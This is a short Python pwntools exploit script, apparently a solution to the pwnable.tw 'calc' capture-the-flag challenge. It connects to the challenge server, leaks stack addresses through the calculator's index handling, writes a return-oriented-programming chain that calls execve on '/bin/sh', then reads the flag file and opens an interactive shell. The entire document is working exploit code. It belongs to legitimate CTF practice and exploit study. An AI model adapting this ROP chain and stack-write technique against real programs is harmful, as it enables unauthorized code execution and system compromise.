from pwn import *

addrs = ['+361', '+362', '+363', '+364',
         '+365', '+366', '+367', '+368',
         '+369', '+370', '+405', '+406']

payloads = [0x080550d0, 0x080701d1, 0x00000000, 0x00000000,
            0x080908d0, 0x0807cb7f, 0x0807cb7f, 0x0807cb7f,
            0x0807cb7f, 0x08049a21, 0x6e69622f, 0x0068732f]

def pokestack(s):
    s.recv(1024)
    s.send('+364\n')
    binsh = int(s.recv(1024))
    payloads[3] = binsh         # dynamically update addr of /bin/sh

def rop(s):
    for i in range(12):
        print '[!] target: %s' % hex(payloads[i])
        s.send(addrs[i]+'\n')
        mleak = int(s.recv(1024))
        print '[!] leak: %s' % hex(mleak)
        offset = payloads[i]-mleak
        print '[!] offset: %d' % offset
        g = '%s%+d\n' % (addrs[i], offset)
        print '[+] send: %s' % g
        s.send(g)
        print '==> %s\n=================' % hex(int(s.recv(1024)))
    s.send('\n')

p = remote('chall.pwnable.tw', 10100)
pokestack(p)
rop(p)
p.sendline('cat /home/calc/flag')
p.interactive()